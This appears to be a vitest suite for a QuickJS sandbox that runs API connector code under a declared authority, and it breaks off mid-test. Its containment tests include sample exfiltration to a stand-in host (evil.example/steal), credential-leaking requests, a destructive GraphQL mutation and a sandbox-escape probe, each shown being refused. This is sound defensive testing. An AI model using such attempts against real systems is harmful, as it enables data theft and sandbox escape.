import { createHmac } from "node:crypto";
import { AdapterError, INCOMPLETE, RestAdapter, type Continuation, type HttpFetch, type HttpResponse } from "@freebirdai/connect/adapters";
import { connectionSchema, getOp, resolveRange, type ConnectionSpec } from "@freebirdai/connect-spec";
import { describe, expect, it } from "vitest";
import { ConnectorAdapter, connectorHash, MemoryConnectorTokens } from "@freebirdai/connect/host";
import { QuickJsSandbox } from "./index.js";

/*
 * The sandbox and its authority, exercised. These show each control working
 * on the attempt it exists for; they cannot prove there is no other way
 * around it — see the residual risks in `dash/PLATFORM.md`.
 */

const API = "api.connector.test";
const OTHER = "other.connector.test";
const FILES = "files.connector.test";
const KEY_ID = "kid_7731";
const SECRET = "sec_q8w9e7";
const PASSWORD = "pw_5566aa";
const NOW = Date.UTC(2026, 8, 28, 12);

interface Sent {
  readonly method: string;
  readonly url: string;
  readonly headers: Readonly<Record<string, string>>;
  readonly body?: string;
}

type Answer = { status: number; body?: unknown; headers?: Record<string, string> };

/** An HTTP transport that answers from a table and remembers every request. */
const transport = (answer: (request: Sent) => Answer) => {
  const sent: Sent[] = [];
  const http: HttpFetch = async (url, init, allowedHost) => {
    const request = { method: init.method ?? "GET", url, headers: init.headers, ...(init.body !== undefined ? { body: init.body } : {}) };
    sent.push(request);
    if (new URL(url).hostname !== allowedHost) throw new Error(`transport pinned to ${allowedHost}`);
    const { status, body, headers = {} } = answer(request);
    const text = typeof body === "string" ? body : body === undefined ? "" : JSON.stringify(body);
    const lower = Object.fromEntries(Object.entries({ "content-type": typeof body === "string" ? "text/plain" : "application/json", ...headers }).map(([k, v]) => [k.toLowerCase(), v]));
    const response: HttpResponse = { status, text, url, header: (name) => lower[name.toLowerCase()] ?? null };
    return response;
  };
  return { http, sent };
};

const secrets: Record<string, string> = { "t-key-1": KEY_ID, "t-key-2": SECRET, "t-pass": PASSWORD };

const connectionWith = (code: string, authority: Record<string, unknown> = {}, extra: Record<string, unknown> = {}): ConnectionSpec =>
  connectionSchema.parse({
    id: "t",
    title: "Test API",
    kind: "rest",
    baseUrl: `https://${API}/v1`,
    auth: {
      type: "connector",
      credentials: [
        { name: "key_id", keyRef: "t-key-1", label: "Key ID" },
        { name: "secret", keyRef: "t-key-2", label: "Secret" },
        { name: "password", keyRef: "t-pass", label: "Password" },
      ],
      tokens: [{ name: "session", keyRef: "t-session" }],
    },
    ops: [
      { id: "records", title: "Records", path: "/records", servedBy: "connector" },
      { id: "listed", title: "Listed", path: "/listed", pagination: { kind: "page", param: "page", startsAt: 1 }, maxPages: 5 },
    ],
    connector: {
      code,
      hash: connectorHash(code),
      hooks: ["read"],
      serves: ["records"],
      authority: {
        destinations: [
          { host: API, methods: ["GET", "POST"], credentials: ["key_id", "secret", "password", "session"] },
          { host: OTHER, methods: ["GET"], credentials: [] },
          { host: FILES, role: "download", methods: ["GET"] },
        ],
        exchanges: [{ name: "session", fields: ["$.account"] }],
        requests: 20,
        sleepMs: 5_000,
        wallMs: 20_000,
        ...authority,
      },
      author: { by: "person", at: "2026-09-28T00:00:00.000Z" },
    },
    ...extra,
  });

const sandbox = new QuickJsSandbox({ memoryBytes: 32 * 1024 * 1024, cpuMs: 1_500, stackBytes: 256 * 1024, wallMs: 20_000 });

const read = async (
  connection: ConnectionSpec,
  http: HttpFetch,
  opId = "records",
  tokens = new MemoryConnectorTokens(),
  asked: {
    readonly overrides?: Record<string, string | number | boolean>;
    readonly filters?: Record<string, string>;
    readonly continueFrom?: Continuation;
  } = {},
) => {
  const logs: string[] = [];
  let clock = NOW;
  const adapter = new ConnectorAdapter(http, {
    sandbox,
    tokens,
    now: () => clock,
    sleep: async (ms) => {
      clock += ms;
    },
    onLog: (_connection, line) => logs.push(line),
  });
  const op = getOp(connection, opId)!;
  const params = { range: resolveRange({ preset: "30d", now: NOW }), filters: asked.filters ?? {} };
  const result = await adapter.fetch(connection, op, asked.overrides ?? {}, {
    params,
    now: NOW,
    resolveSecret: async (keyRef) => secrets[keyRef] ?? null,
    ...(asked.continueFrom ? { continueFrom: asked.continueFrom } : {}),
  });
  return { result, logs };
};

const refusal = async (promise: Promise<unknown>): Promise<AdapterError> => {
  try {
    await promise;
  } catch (error) {
    expect(error).toBeInstanceOf(AdapterError);
    return error as AdapterError;
  }
  throw new Error("expected the read to be refused");
};

describe("connector: reading", () => {
  it("reads records a connector's code produces, from its own requests", async () => {
    const { http, sent } = transport((request) =>
      request.url.endsWith("/v1/items?page=2") ? { status: 200, body: { items: [{ id: 3 }], next: null } } : { status: 200, body: { items: [{ id: 1 }, { id: 2 }], next: 2 } },
    );
    const code = `async function read(ctx) {
      const rows = [];
      let page = 1;
      while (page) {
        const answer = await http.request({ url: "/items", query: { page } });
        rows.push(...answer.body.items);
        page = answer.body.next;
      }
      return { rows, total: 3 };
    }`;
    const { result } = await read(connectionWith(code), http);
    expect(result.body).toEqual([{ id: 1 }, { id: 2 }, { id: 3 }]);
    expect(result.meta.reportedTotal).toBe(3);
    expect(result.meta.truncated).toBe(false);
    expect(sent.map((one) => one.url)).toEqual([`https://${API}/v1/items?page=1`, `https://${API}/v1/items?page=2`]);
  });

  it("signs every request a declared endpoint sends, and never hands the code a secret", async () => {
    const expected = (request: Sent) => createHmac("sha256", SECRET).update(`${request.method} ${new URL(request.url).pathname}${new URL(request.url).search}`).digest("hex");
    const { http, sent } = transport((request) => {
      if (request.headers["x-signature"] !== expected(request) || request.headers["x-key"] !== KEY_ID) return { status: 401, body: { error: "bad signature" } };
      const page = new URL(request.url).searchParams.get("page");
      return { status: 200, body: page === "1" ? [{ id: 1 }, { id: 2 }] : [] };
    });
    const code = `async function signRequest(request) {
      const url = request.url.replace(/^https:\\/\\/[^/]+/, "");
      request.headers["x-key"] = "{{secret:key_id}}";
      request.headers["x-signature"] = await crypto.hmac({ key: "secret", data: request.method + " " + url });
      return request;
    }`;
    const connection = connectionWith(code, {}, {});
    const signed = { ...connection, connector: { ...connection.connector!, hooks: ["signRequest" as const], serves: [] } };
    const { result } = await read(signed, http, "listed");
    expect(result.body).toEqual([{ id: 1 }, { id: 2 }]);
    expect(sent).toHaveLength(2);
    expect(sent.every((one) => one.headers["x-key"] === KEY_ID)).toBe(true);
  });

  it("does not run code that no longer matches its pin", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const connection = connectionWith("async function read() { return [] }");
    const tampered = { ...connection, connector: { ...connection.connector!, code: "async function read() { return [{ changed: true }] }" } };
    const error = await refusal(read(tampered, http));
    expect(error.userMessage).toMatch(/changed since it was checked/);
    expect(sent).toHaveLength(0);
  });

  it("gives the code the server's clock, and no network, file system or process of its own", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() {
      return [{ now: Date.now(), iso: new Date().toISOString(), fetch: typeof fetch, require: typeof require, process: typeof process, std: typeof std, os: typeof os, XMLHttpRequest: typeof XMLHttpRequest }];
    }`;
    const { result } = await read(connectionWith(code), http);
    expect(result.body).toEqual([
      { now: NOW, iso: new Date(NOW).toISOString(), fetch: "undefined", require: "undefined", process: "undefined", std: "undefined", os: "undefined", XMLHttpRequest: "undefined" },
    ]);
  });

  it("builds and reads addresses with URL, as code written for the web expects", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() {
      const url = new URL("/exports/7/file?sig=a%20b", "https://api.example.test/v1/");
      url.searchParams.set("page", 2);
      return [{ href: url.href, host: url.hostname, path: url.pathname, sig: url.searchParams.get("sig") }];
    }`;
    const { result } = await read(connectionWith(code), http);
    expect(result.body).toEqual([
      { href: "https://api.example.test/exports/7/file?sig=a%20b&page=2", host: "api.example.test", path: "/exports/7/file", sig: "a b" },
    ]);
  });

  it("parses CSV the way a spreadsheet would", async () => {
    const csv = 'id,amount,note,when\r\n1,12.50,"a, ""quoted"" b",2026-07-01\r\n2,0.75,,007\r\n\r\n';
    const { http } = transport(() => ({ status: 200, body: csv, headers: { "content-type": "text/csv" } }));
    const code = `async function read() { return (await http.request({ url: "/export" })).body }`;
    const { result } = await read(connectionWith(code), http);
    expect(result.body).toEqual([
      { id: 1, amount: 12.5, note: 'a, "quoted" b', when: "2026-07-01" },
      { id: 2, amount: 0.75, note: null, when: "007" },
    ]);
  });

  /* XML, read by the server rather than picked apart by the code. */
  it("reads XML by its content type, and on request", async () => {
    const xml = `<?xml version="1.0"?><batch id="7"><tx><id>1</id><amount>12.50</amount></tx><tx><id>2</id><amount>3</amount></tx></batch>`;
    const { http } = transport(() => ({ status: 200, body: xml, headers: { "content-type": "text/xml" } }));
    const code = `async function read() {
      const answer = await http.request({ url: "/batch" });
      const again = await XML.parse("<a><b>1</b><b>2</b></a>");
      return [].concat(answer.body.batch.tx).map((one) => ({ ...one, batch: answer.body.batch.id, again: again.a.b.length }));
    }`;
    const { result } = await read(connectionWith(code), http);
    expect(result.body).toEqual([
      { id: 1, amount: 12.5, batch: 7, again: 2 },
      { id: 2, amount: 3, batch: 7, again: 2 },
    ]);
  });

  /* 2026-09-30: a read that needed 151 requests stopped at a run's allowance, and said it was incomplete. */
  it("carries a read on in another run, with a fresh allowance, from where the code says it got to", async () => {
    const { http, sent } = transport((request) => {
      const page = Number(new URL(request.url).searchParams.get("page"));
      return { status: 200, body: { items: page <= 45 ? [{ id: page }] : [] } };
    });
    /* Twenty requests a run (the authority's allowance here); forty-five pages to read. */
    const code = `async function read(ctx) {
      const rows = [];
      let page = ctx.resume ? ctx.resume.page : 1;
      for (let sent = 0; sent < 18; sent++, page++) {
        const answer = await http.request({ url: "/items", query: { page } });
        if (answer.body.items.length === 0) return { rows, done: "all" };
        rows.push(...answer.body.items);
      }
      return { rows, resume: { page } };
    }`;
    const { result } = await read(connectionWith(code), http);
    expect((result.body as { id: number }[]).map((one) => one.id)).toEqual(Array.from({ length: 45 }, (_, index) => index + 1));
    expect(result.meta).toMatchObject({ truncated: false, warnings: [], completion: { state: "traversed", reason: "connector-all" } });
    expect(sent).toHaveLength(46);
  });

  it("stops a read that is not moving on, or that would take more runs than a read is given, and says so", async () => {
    const { http } = transport(() => ({ status: 200, body: { items: [{ id: 1 }] } }));
    const stuck = `async function read(ctx) { await http.request({ url: "/items" }); return { rows: [{ id: 1 }], resume: { page: 1 } }; }`;
    const first = await read(connectionWith(stuck), http);
    expect(first.result.meta.truncated).toBe(true);
    expect(first.result.body).toHaveLength(2);
    const endless = `async function read(ctx) { const n = (ctx.resume || 0) + 1; return { rows: [{ n }], resume: n }; }`;
    const second = await read(connectionWith(endless), http);
    expect(second.result.body).toHaveLength(10);
    expect(second.result.meta.warnings.join(" ")).toMatch(/connector stopped before the end/);
  });

  /* Out of runs, still moving on — where it got to, for a read in the background to carry on from. */
  it("says where a read out of runs got to, and carries it on from there, for that read only", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const endless = `async function read(ctx) { const n = (ctx.resume || 0) + 1; return n > 25 ? { rows: [], done: "all" } : { rows: [{ n }], resume: n }; }`;
    const connection = connectionWith(endless);
    const first = await read(connection, http);
    expect(first.result.meta).toMatchObject({
      completion: { state: "partial", reason: "run-limit" },
      continuation: { kind: "connector", resume: 10, pageIndex: 10, collected: 10 },
    });
    const second = await read(connection, http, "records", undefined, { continueFrom: first.result.meta.continuation! });
    expect((second.result.body as { n: number }[]).map((one) => one.n)).toEqual(Array.from({ length: 10 }, (_, index) => index + 11));
    const third = await read(connection, http, "records", undefined, { continueFrom: second.result.meta.continuation! });
    expect((third.result.body as { n: number }[]).map((one) => one.n)).toEqual([21, 22, 23, 24, 25]);
    expect(third.result.meta).toMatchObject({ completion: { state: "traversed", reason: "connector-all" } });
    expect(third.result.meta.continuation).toBeUndefined();
    /* Another read's place is not this one's. */
    const error = await refusal(read(connection, http, "records", undefined, { continueFrom: { ...first.result.meta.continuation!, scope: "elsewhere" } }));
    expect(error.status).toBe(409);
  });

  it("says so when the code stopped short", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const { result } = await read(connectionWith(`async function read() { return { rows: [{ a: 1 }], total: 5 } }`), http);
    expect(result.meta.truncated).toBe(true);
    expect(result.meta.warnings.join(" ")).toMatch(/reports 5 record\(s\).*excludes/);
  });
});

describe("connector: containment", () => {
  it("stops code that never ends", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const error = await refusal(read(connectionWith("async function read() { while (true) {} }"), http));
    expect(error.userMessage).toMatch(/ran longer than it may/);
  });

  it("stops code that allocates without bound", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const error = await refusal(
      read(connectionWith("async function read() { const all = []; for (;;) all.push(new Array(100000).fill(7)); }"), http),
    );
    expect(error.userMessage).toMatch(/more memory than it may/);
  });

  it("refuses an address the authority does not list, before anything is sent", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const error = await refusal(read(connectionWith(`async function read() { await http.request({ url: "https://evil.example/steal" }); return [] }`), http));
    expect(error.userMessage).toMatch(/evil\.example is not an address this connector may reach/);
    expect(sent).toHaveLength(0);
  });

  it("refuses a method that changes things, and one the address does not allow", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const put = await refusal(read(connectionWith(`async function read() { await http.request({ method: "DELETE", url: "/records/1" }); return [] }`), http));
    expect(put.userMessage).toMatch(/changes things.*review/);
    const post = await refusal(read(connectionWith(`async function read() { await http.request({ method: "POST", url: "https://${OTHER}/x", body: "{}" }); return [] }`), http));
    expect(post.userMessage).toMatch(/POST is not allowed to other\.connector\.test/);
    expect(sent).toHaveLength(0);
  });

  it("puts a credential only into a request to an address bound to it", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() { await http.request({ url: "https://${OTHER}/x", headers: { authorization: "Bearer {{secret:secret}}" } }); return [] }`;
    const error = await refusal(read(connectionWith(code), http));
    expect(error.userMessage).toMatch(/"secret" may not be sent to other\.connector\.test/);
    expect(sent).toHaveLength(0);
  });

  it("refuses a signature made with a credential on its way to an address not bound to it", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() {
      const signature = await crypto.hmac({ key: "secret", data: "anything the code likes" });
      await http.request({ url: "https://${OTHER}/collect", query: { s: signature } });
      return [];
    }`;
    const error = await refusal(read(connectionWith(code), http));
    expect(error.userMessage).toMatch(/signature made with "secret" may not be sent/);
    expect(sent).toHaveLength(0);
  });

  it("does not follow a redirect to another host, and refuses the code's own attempt to", async () => {
    const { http, sent } = transport((request) =>
      request.url.includes(OTHER) ? { status: 200, body: [] } : { status: 302, headers: { location: `https://evil.example/landing` } },
    );
    const code = `async function read() {
      const first = await http.request({ url: "/start" });
      await http.request({ url: first.headers.location });
      return [];
    }`;
    const error = await refusal(read(connectionWith(code), http));
    expect(error.userMessage).toMatch(/evil\.example is not an address/);
    expect(sent.map((one) => new URL(one.url).hostname)).toEqual([API]);
  });

  it("reaches a download address only where the API gave it, and never with a credential", async () => {
    const file = `https://${FILES}/exports/9/data.csv?sig=abc`;
    const { http, sent } = transport((request) =>
      request.url.startsWith(`https://${FILES}`) ? { status: 200, body: "a,b\n1,2", headers: { "content-type": "text/csv" } } : { status: 200, body: { url: file } },
    );
    const invented = await refusal(read(connectionWith(`async function read() { return (await http.request({ url: "https://${FILES}/exports/1/data.csv" })).body }`), http));
    expect(invented.userMessage).toMatch(/download address the API did not give/);
    const withKey = await refusal(
      read(connectionWith(`async function read() { const a = await http.request({ url: "/exports/9" }); return (await http.request({ url: a.body.url, headers: { "x-key": "{{secret:key_id}}" } })).body }`), http),
    );
    expect(withKey.userMessage).toMatch(/"key_id" may not be sent to files\.connector\.test/);
    const { result } = await read(connectionWith(`async function read() { const a = await http.request({ url: "/exports/9" }); return (await http.request({ url: a.body.url })).body }`), http);
    expect(result.body).toEqual([{ a: 1, b: 2 }]);
    expect(sent.filter((one) => one.url.startsWith(`https://${FILES}`))).toHaveLength(1);
  });

  it("takes an echoed credential out of what the code sees", async () => {
    const { http } = transport((request) => ({ status: 200, body: { youSent: request.headers["x-key"] } }));
    const code = `async function read() {
      const answer = await http.request({ url: "/echo", headers: { "x-key": "{{secret:secret}}" } });
      log("the API said", answer.body.youSent);
      return [{ echoed: answer.body.youSent }];
    }`;
    const { result, logs } = await read(connectionWith(code), http);
    expect(result.body).toEqual([{ echoed: "[redacted]" }]);
    expect(logs.join(" ")).not.toContain(SECRET);
  });

  it("keeps a login's token host-side, hands back only declared fields, and reuses it", async () => {
    let logins = 0;
    const { http, sent } = transport((request) => {
      if (request.url.endsWith("/login")) {
        logins++;
        const body = JSON.parse(request.body ?? "{}");
        return body.password === PASSWORD ? { status: 200, body: { token: "tok_live_123456", ttl: 3600, account: "acme", internal: "hidden" } } : { status: 401, body: {} };
      }
      return request.headers.authorization === "Bearer tok_live_123456" ? { status: 200, body: [{ ok: true }] } : { status: 401, body: {} };
    });
    const code = `async function authenticate() {
      const session = await auth.exchange({ name: "session", request: { method: "POST", url: "/login", body: { password: "{{secret:password}}" } }, token: "$.token", expiresIn: "$.ttl", fields: ["$.account", "$.internal"] });
      log(JSON.stringify(session));
    }
    async function read() {
      return (await http.request({ url: "/things", headers: { authorization: "Bearer {{secret:session}}" } })).body;
    }`;
    const tokens = new MemoryConnectorTokens();
    const connection = connectionWith(code);
    const both = { ...connection, connector: { ...connection.connector!, hooks: ["authenticate" as const, "read" as const] } };
    const first = await read(both, http, "records", tokens);
    expect(first.result.body).toEqual([{ ok: true }]);
    expect(first.logs.join(" ")).toContain('"$.account":"acme"');
    expect(first.logs.join(" ")).not.toContain("hidden");
    expect(first.logs.join(" ")).not.toContain("tok_live");
    await read(both, http, "records", tokens);
    expect(logins).toBe(1);
    expect(sent.filter((one) => one.url.endsWith("/things"))).toHaveLength(2);
  });

  /* Regression: a signRequest that adds the session asked for one on the login that creates it. */
  it("does not pass a login through signRequest unless asked", async () => {
    const { http } = transport((request) =>
      request.url.endsWith("/login")
        ? request.headers["x-session"] !== undefined
          ? { status: 400, body: { error: "the login carried a session" } }
          : { status: 200, body: { token: "tok_live_7890ab", ttl: 600 } }
        : { status: 200, body: [{ session: request.headers["x-session"] === "tok_live_7890ab" }] },
    );
    const code = `async function authenticate() {
      await auth.exchange({ name: "session", request: { method: "POST", url: "/login", body: { password: "{{secret:password}}" } }, token: "$.token", expiresIn: "$.ttl" });
    }
    async function signRequest(request) { request.headers["x-session"] = "{{secret:session}}"; return request; }
    async function read() { return (await http.request({ url: "/things" })).body; }`;
    const connection = connectionWith(code);
    const { result } = await read({ ...connection, connector: { ...connection.connector!, hooks: ["authenticate", "signRequest", "read"] } }, http);
    expect(result.body).toEqual([{ session: true }]);
  });

  it("stops at the run's request allowance and its waiting allowance", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const many = await refusal(read(connectionWith(`async function read() { for (let i = 0; i < 50; i++) await http.request({ url: "/x" }); return [] }`, { requests: 5 }), http));
    expect(many.userMessage).toMatch(/all 5 requests it may/);
    expect(sent).toHaveLength(5);
    const waits = await refusal(read(connectionWith(`async function read() { await sleep(4000); await sleep(4000); return [] }`), http));
    expect(waits.userMessage).toMatch(/may wait 5s in all/);
  });

  it("sends a failed read again within the allowance, and a POST never", async () => {
    let calls = 0;
    const { http } = transport((request) => {
      calls++;
      return request.method === "GET" && calls < 2 ? { status: 503, body: {} } : request.method === "POST" ? { status: 503, body: {} } : { status: 200, body: [{ ok: 1 }] };
    });
    const { result } = await read(connectionWith(`async function read() { return (await http.request({ url: "/x" })).body }`), http);
    expect(result.body).toEqual([{ ok: 1 }]);
    calls = 0;
    const { http: http2, sent } = transport(() => ({ status: 503, body: {} }));
    await refusal(read(connectionWith(`async function read() { const a = await http.request({ method: "POST", url: "/search", body: {} }); if (a.status >= 500) throw new Error("server error"); return [] }`, { retries: 3 }), http2));
    expect(sent).toHaveLength(1);
  });

  it("hands the code an identifier it declared, and never a secret, whatever it declares", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const base = connectionWith(`async function read() { return [{ id: await credentials.identifier("key_id") }] }`);
    const auth = base.auth.type === "connector" ? base.auth : null;
    const declared = (secretOf: (name: string) => boolean | undefined) => ({
      ...base,
      auth: { ...auth!, credentials: auth!.credentials.map((one) => ({ ...one, secret: secretOf(one.name) })) },
    });
    const { result } = await read(declared((name) => (name === "key_id" ? false : undefined)), http);
    expect(result.body).toEqual([{ id: KEY_ID }]);

    /* Not declared an identifier: a secret, used for the code and never handed over. */
    const undeclared = await refusal(read(base, http));
    expect(undeclared.userMessage).toMatch(/"key_id" is a secret/);

    /* Declared one, but named like a secret: still refused. */
    const named = connectionWith(`async function read() { return [{ s: await credentials.identifier("secret") }] }`);
    const namedAuth = named.auth.type === "connector" ? named.auth : null;
    const claimed = { ...named, auth: { ...namedAuth!, credentials: namedAuth!.credentials.map((one) => ({ ...one, secret: false })) } };
    const refused = await refusal(read(claimed, http));
    expect(refused.userMessage).toMatch(/"secret" is a secret/);
  });

  it("cannot reach the server's own globals or environment", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() {
      let escaped = "no";
      try { escaped = globalThis.constructor.constructor("return typeof process + typeof require + typeof fetch")(); } catch (e) { escaped = "threw"; }
      return [{ escaped, keys: Object.keys(globalThis).filter((k) => !k.startsWith("__")).sort().join(",") }];
    }`;
    const { result } = await read(connectionWith(code), http);
    const [row] = result.body as Array<{ escaped: string; keys: string }>;
    expect(row!.escaped).toBe("undefinedundefinedundefined");
    expect(row!.keys).not.toMatch(/process|require|fetch|Buffer/);
  });
});

describe("connector: the same request REST sends", () => {
  /* One endpoint, three kinds of input: a path id from the board, a widget's own value, a header with a documented default. */
  const orders = {
    id: "orders",
    title: "Orders",
    path: "/accounts/{{param.account}}/orders",
    query: { limit: 50 },
    params: [
      { name: "account", in: "path", required: true },
      { name: "status", in: "query" },
      { name: "x-api-version", in: "header", default: "2" },
    ],
  };
  const asked = { overrides: { status: "open" }, filters: { account: "42" } };
  const answer = () => ({ status: 200, body: { orders: [{ id: 1, status: "open" }] } });
  /* The orders endpoint, read by this code. */
  const servedOrders = (code: string, hooks: Array<"read" | "parse"> = ["read"]): ConnectionSpec => {
    const connection = connectionWith(code, {}, { ops: [{ ...orders, servedBy: "connector" }] });
    return { ...connection, connector: { ...connection.connector!, hooks, serves: ["orders"] } };
  };

  it("sends a widget's own values from connector code, as REST does", async () => {
    const viaRest = transport(answer);
    const rest = connectionSchema.parse({
      id: "r",
      title: "Test API",
      kind: "rest",
      baseUrl: `https://${API}/v1`,
      auth: { type: "none" },
      ops: [{ ...orders, rowsPath: "$.orders" }],
    });
    await new RestAdapter(viaRest.http).fetch(rest, getOp(rest, "orders")!, asked.overrides, {
      params: { range: resolveRange({ preset: "30d", now: NOW }), filters: asked.filters },
      now: NOW,
    });

    /* No read() of its own: the endpoint's request, as resolved, and parse() over the answer. */
    const code = `async function parse(response) { return { rows: JSON.parse(response.text).orders }; }`;
    const viaCode = transport(answer);
    const { result } = await read(servedOrders(code, ["parse"]), viaCode.http, "orders", new MemoryConnectorTokens(), asked);

    const lower = (headers: Readonly<Record<string, string>>) =>
      Object.fromEntries(Object.entries(headers).map(([name, value]) => [name.toLowerCase(), value]));
    const [fromRest] = viaRest.sent;
    const [fromCode] = viaCode.sent;
    expect(fromRest!.url).toBe(`https://${API}/v1/accounts/42/orders?limit=50&status=open`);
    expect(fromCode!.url).toBe(fromRest!.url);
    expect(fromCode!.method).toBe(fromRest!.method);
    expect(lower(fromCode!.headers)["x-api-version"]).toBe("2");
    expect(lower(fromCode!.headers)["x-api-version"]).toBe(lower(fromRest!.headers)["x-api-version"]);
    expect(result.body).toEqual([{ id: 1, status: "open" }]);
  });

  it("gives a connector's read() every input it was asked with", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read(ctx) { return [{ inputs: ctx.inputs, url: ctx.request.url }]; }`;
    const { result } = await read(servedOrders(code), http, "orders", new MemoryConnectorTokens(), asked);
    const [row] = result.body as Array<{ inputs: Record<string, unknown>; url: string }>;
    expect(row!.inputs).toEqual({ "x-api-version": "2", account: "42", status: "open" });
    expect(row!.url).toContain("status=open");
  });

  it("lists what nobody supplied, for the code to find, rather than refusing", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read(ctx) { return [{ missing: ctx.request.missing }]; }`;
    const { result } = await read(servedOrders(code), http, "orders");
    expect(result.body).toEqual([{ missing: ["account"] }]);
  });
});

/* Complete only on the code's own word, and a sign-in is not a page. */
describe("connector: how a read ended", () => {
  const api = () =>
    transport((request) =>
      request.url.endsWith("/v1/login")
        ? { status: 200, body: { token: "tok_abcdef123", expires_in: 600 } }
        : { status: 200, body: { items: [{ id: Number(new URL(request.url).searchParams.get("page") ?? 1) }] } },
    );
  const code = (ending: string) => `async function authenticate() {
      await auth.exchange({ name: "session", request: { method: "POST", url: "/login", body: { password: "{{secret:password}}" } }, token: "$.token" });
    }
    async function read() {
      const rows = [];
      for (let page = 1; page <= 3; page++) {
        const answer = await http.request({ url: "/items", query: { page }, headers: { authorization: "Bearer {{secret:session}}" } });
        rows.push(...answer.body.items);
      }
      return ${ending};
    }`;
  const withLogin = (source: string) => {
    const connection = connectionWith(source);
    return { ...connection, connector: { ...connection.connector!, hooks: ["authenticate" as const, "read" as const] } };
  };

  it("counts pages of records, not the sign-in, and says it read to the end only when the code does", async () => {
    const { http, sent } = api();
    const { result } = await read(withLogin(code(`{ rows, done: "all", pages: 3 }`)), http);
    expect(sent).toHaveLength(4);
    expect(result.meta).toMatchObject({ pages: 3, requests: 4, truncated: false, completion: { state: "traversed", reason: "connector-all" } });
  });

  it("claims nothing for code that returns records without saying they were all of them", async () => {
    const { http } = api();
    const { result } = await read(withLogin(code("{ rows }")), http);
    expect(result.body).toHaveLength(3);
    expect(result.meta.completion).toEqual({ state: "unknown", reason: "connector-silent" });
    expect(result.meta.truncated).toBe(false);
    expect(result.meta.warnings).toContain(INCOMPLETE.unknownEnd);
    /* One run of records, however many requests it took: never the four requests counted as pages. */
    expect(result.meta.pages).toBe(1);
  });

  it("says a read the code stopped is partial", async () => {
    const { http } = api();
    const { result } = await read(withLogin(code(`{ rows, done: "partial", reason: "the export was still running" }`)), http);
    expect(result.meta).toMatchObject({ truncated: true, completion: { state: "partial", reason: "connector-partial" } });
  });

  it("trusts the code's own total only alongside its word that it read to the end", async () => {
    const { http } = api();
    const silent = await read(withLogin(code("{ rows, total: 3 }")), http);
    expect(silent.result.meta.reportedTotal).toBe(3);
    expect(silent.result.meta.totalScope).toBeUndefined();
    const said = await read(withLogin(code(`{ rows, total: 3, done: "all" }`)), http);
    expect(said.result.meta.totalScope).toBe(said.result.meta.scope);
  });
});

/*
 * Every request against the templates the connector
 * declared, before anything leaves. These show each refusal working on the
 * attempt it exists for; they do not prove there is no other way around it.
 */
describe("connector: request templates", () => {
  const templates = [
    { id: "search", purpose: "search", method: "POST", host: API, path: "/v1/search", credentials: ["secret"], body: { type: "json", keys: ["query", "page"] } },
    { id: "items", purpose: "read", method: "GET", host: API, path: "/v1/items/{id}", credentials: [] },
    { id: "graph", purpose: "search", method: "POST", host: API, path: "/v1/graphql", credentials: [], body: { type: "graphql" } },
  ];
  const strict = (code: string) => connectionWith(code, { templates });

  it("sends what a template allows, and refuses before sending a POST anywhere else on the same host", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: { items: [{ id: 1 }] } }));
    const allowed = await read(strict(`async function read() { return { rows: (await http.request({ method: "POST", url: "/search", headers: { authorization: "{{secret:secret}}" }, body: { query: "open" } })).body.items, done: "all" }; }`), http);
    expect(allowed.result.body).toEqual([{ id: 1 }]);
    const before = sent.length;
    const error = await refusal(read(strict(`async function read() { await http.request({ method: "POST", url: "/records/7/archive", body: {} }); return []; }`), http));
    expect(error.userMessage).toMatch(/POST \/v1\/records\/7\/archive is not a request this connector declared/);
    expect(sent.length).toBe(before);
  });

  it("puts a credential only into a request whose template names it", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: {} }));
    /* The host may receive the secret, but this request's template does not carry it. */
    const error = await refusal(read(strict(`async function read() { await http.request({ url: "/items/3", headers: { authorization: "{{secret:secret}}" } }); return []; }`), http));
    expect(error.userMessage).toMatch(/"secret" may not be sent/);
    expect(sent).toHaveLength(0);
  });

  it("refuses a body field the template does not list, and a GraphQL document that could change something", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: {} }));
    const extra = await refusal(read(strict(`async function read() { await http.request({ method: "POST", url: "/search", headers: { authorization: "{{secret:secret}}" }, body: { query: "x", delete: true } }); return []; }`), http));
    expect(extra.userMessage).toMatch(/carries delete, which search does not allow/);
    const mutation = await refusal(read(strict(`async function read() { await http.request({ method: "POST", url: "/graphql", body: { query: "mutation { deleteAll }" } }); return []; }`), http));
    expect(mutation.userMessage).toMatch(/GraphQL document that can change something/);
    expect(sent).toHaveLength(0);
  });

  it("refuses an endpoint the catalog knows changes the account, even to a connector from before templates", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: {} }));
    const logs: string[] = [];
    const adapter = new ConnectorAdapter(http, {
      sandbox,
      tokens: new MemoryConnectorTokens(),
      now: () => NOW,
      onLog: (_c, line) => logs.push(line),
      writes: () => [{ method: "POST", path: "/records/{{param.id}}/archive" }],
    });
    const connection = connectionWith(`async function read() { await http.request({ method: "POST", url: "/records/7/archive", body: {} }); return []; }`);
    const error = await refusal(
      adapter.fetch(connection, getOp(connection, "records")!, {}, { params: { range: resolveRange({ preset: "30d", now: NOW }), filters: {} }, now: NOW, resolveSecret: async (keyRef) => secrets[keyRef] ?? null }),
    );
    expect(error.userMessage).toMatch(/changes things in the account/);
    expect(sent).toHaveLength(0);
  });

  it("lets code sign a declared endpoint's request, but never send it elsewhere", async () => {
